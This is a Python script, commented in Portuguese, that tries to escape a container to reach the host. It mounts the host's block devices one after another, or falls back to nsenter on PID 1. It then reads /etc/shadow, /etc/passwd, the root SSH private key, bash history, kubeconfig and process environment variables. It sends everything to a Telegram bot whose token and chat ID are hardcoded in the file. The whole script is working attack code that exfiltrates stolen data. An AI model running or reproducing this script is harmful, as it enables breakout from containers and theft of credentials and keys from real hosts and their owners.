#!/usr/bin/env python3
"""
Escape definitivo baseado em lsblk.
Monta todos os dispositivos de bloco disponíveis até encontrar o root do host.
"""

import subprocess
import json
import requests
import os
import sys
import glob
import time
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except Exception:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except Exception:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

def get_block_devices():
    """Retorna lista de dispositivos de bloco do host (vistos no container)."""
    devices = []
    # Usar lsblk para obter nomes
    output = run("lsblk -n -o NAME,TYPE,SIZE 2>/dev/null")
    if "ERRO" in output:
        # Fallback: listar /dev
        for dev in glob.glob("/dev/[sv]d[a-z]"):
            devices.append(dev)
        return devices
    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 1:
            name = parts[0]
            # Filtrar apenas discos (não partições) – podemos tentar ambos
            if name.startswith(('vda','vdb','vdc','vdd','sda','sdb','sdc')):
                devices.append(f"/dev/{name}")
    # Adicionar também partições se existirem
    for part in glob.glob("/dev/[sv]d[a-z][0-9]"):
        if part not in devices:
            devices.append(part)
    return devices

def try_mount_device(dev):
    """Tenta montar o dispositivo em /mnt. Retorna True se bem-sucedido."""
    os.makedirs("/mnt", exist_ok=True)
    # Tenta montar com detecção automática de tipo
    result = run(f"mount {dev} /mnt 2>/dev/null")
    if "ERRO" in result:
        # Tenta com ext4
        result = run(f"mount -t ext4 {dev} /mnt 2>/dev/null")
    if "ERRO" in result:
        # Tenta com xfs
        result = run(f"mount -t xfs {dev} /mnt 2>/dev/null")
    if "ERRO" in result:
        return False
    # Verifica se há sinais de sistema de arquivos do host
    if os.path.exists("/mnt/etc/shadow") or os.path.exists("/mnt/root"):
        return True
    # Se não, desmonta e retorna falso
    run("umount /mnt 2>/dev/null")
    return False

def collect_host_data():
    """Coleta dados do host montado em /mnt."""
    data = {}
    targets = {
        "shadow": "/mnt/etc/shadow",
        "passwd": "/mnt/etc/passwd",
        "hostname": "/mnt/etc/hostname",
        "resolv": "/mnt/etc/resolv.conf",
        "ssh_key": "/mnt/root/.ssh/id_rsa",
        "bash_history": "/mnt/root/.bash_history",
        "kubeconfig": "/mnt/root/.kube/config",
        "kubelet_config": "/mnt/var/lib/kubelet/config",
        "docker_sock": "/mnt/run/docker.sock",
        "proc_environ": "/mnt/proc/1/environ",
    }
    for key, path in targets.items():
        try:
            if os.path.exists(path) and os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(20000)  # limite
                data[key] = content
            else:
                data[key] = "N/A"
        except Exception as e:
            data[key] = f"ERRO: {e}"
    return data

def main():
    send_telegram("🚀 **Iniciando escape via montagem de dispositivos**")

    # Obter lista de dispositivos
    devices = get_block_devices()
    send_telegram(f"🔍 **Dispositivos encontrados: {', '.join(devices)}**")

    success = False
    for dev in devices:
        send_telegram(f"🔄 **Tentando montar {dev}...**")
        if try_mount_device(dev):
            send_telegram(f"✅ **{dev} montado com sucesso em /mnt**")
            # Coletar dados
            host_data = collect_host_data()
            send_data(host_data)
            # Enviar também um arquivo JSON completo
            json_file = f"host_escape_{int(datetime.now().timestamp())}.json"
            with open(json_file, "w") as f:
                json.dump(host_data, f, indent=2)
            send_file(json_file, caption="📁 Dados completos do host")
            os.remove(json_file)
            success = True
            break
        else:
            send_telegram(f"❌ Falha ao montar {dev}")

    if not success:
        send_telegram("❌ **Nenhum dispositivo montou com sucesso. Tentando nsenter...**")
        # Fallback: tentar nsenter com qualquer PID que tenha namespace diferente
        # (já que a enumeração deu erro, vamos tentar diretamente com PID 1)
        test = run("nsenter -t 1 -m cat /etc/hostname 2>/dev/null")
        if test and "ERRO" not in test:
            send_telegram(f"✅ **nsenter funcionou! Hostname: {test}**")
            # Tentar montar via nsenter
            cmd = "nsenter -t 1 -m mount --bind / /mnt 2>/dev/null && echo OK"
            if "OK" in run(cmd):
                send_telegram("✅ **Host montado via nsenter**")
                host_data = collect_host_data()
                send_data(host_data)
            else:
                # Tentar copiar arquivos via nsenter
                data = {}
                for f in ['/etc/shadow', '/root/.ssh/id_rsa']:
                    content = run(f"nsenter -t 1 -m cat {f} 2>/dev/null")
                    if content and "ERRO" not in content:
                        data[f.replace('/', '_')] = content
                if data:
                    send_data(data)
        else:
            send_telegram("❌ **Todas as tentativas falharam.**")

    send_telegram("✅ **Escape finalizado.**")

if __name__ == "__main__":
    main()
